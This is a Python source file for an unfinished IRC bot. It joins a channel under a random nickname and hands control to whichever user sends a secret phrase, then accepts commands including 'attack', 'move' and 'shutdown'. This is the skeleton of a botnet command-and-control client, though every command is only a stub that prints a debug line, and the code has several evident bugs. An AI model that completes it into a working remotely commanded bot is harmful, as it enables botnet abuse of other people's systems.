#!/usr/bin/python3

import sys
import socket
import random
import numpy
import string

class PyBot:
  #PyBot object constructor 
  def __init__(self,host,port,channel,secret,s):

    #Create PyBot instanace variables
    self.host = host
    self.port = port
    self.channel = channel
    self.secret = secret
    self.nick = self.generateRandomName()
    self.controlMode = 0 #default 0 = bot not being controller
    self.controllerName = ""

    try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
      self.s = s.connect((host,int(port)))
      s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
      s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
    except:
      print("unable to connect to irc server")

    try:
      s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
    except:
      print("DEBUG --> unable to join channnel on server")
     
  def listen(self):
    while True:
      data = ""
      data = s.recv(4096).decode("UTF-8")
      data = data.strip("\n\r")
      print("DEBUG --> data recieved: " + data)

      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
        s.send(bytes("PONG :pingis\n","UTF-8"))

      elif data.find("PRIVMSG") != -1:
        temp = data.split("!")
        user = temp[0][1:] #extract and trim user from temp
        temp = data.split("PRIVMSG")
        temp2 = temp[1].split(":")
        message = temp2[1]
        self.examinePrivmsg(user,message)

      elif data.find("KICK :") != -1:
          s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel

  def examinePrivmsg(self,user,message):
    
    print("DEBUG --> "+user+" says:"+message)

    if message == secret and self.controlMode == 0:
      print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
      self.controlMode = 1
      self.controllerName = user
    
    elif self.controlMode == 1 and user == self.controllerName: 
# NOTE --> The 'attack' and 'move' messages will be followed by who to attack and where to move to, so the tests will have to be .startswith()
      if message == "status":
        print("DEBUG --> status requested by controller")
      elif message == "attack":
        print("DEBUG --> attack requested by controller")
      elif message == "move":
        print("DEBUG --> move requested by controller")
      elif message == "quit":
        print("DEBUG --> move requested by controller")
      elif message == "shutdown":
        print("DEBUG --> move requested by controller")

  def changeChannel(self,newChannel):
    print("DEBUG --> Changing channel")     

  def generateRandomName(self):
    #randomName = "Bot" + random.choice(string.digits) + random.choice(string.digits)
    #UPDATE --> The following line is fixed:
    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
    return randomName

#Main
if __name__ == '__main__':

  if(len(sys.argv) == 5):
    host = sys.argv[1]
    port = sys.argv[2]
    channel = "#"+sys.argv[3]
    secret = sys.argv[4]
  else:
    print("Incorrect number of arguments")
    sys.exit("Usage: bot <hostname> <port> <channel> <secret-phrase>")

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot = PyBot(host,port,channel,secret,s) #Create an instance of the bot 
  bot.listen() #listen to channel for incoming data over socket
  












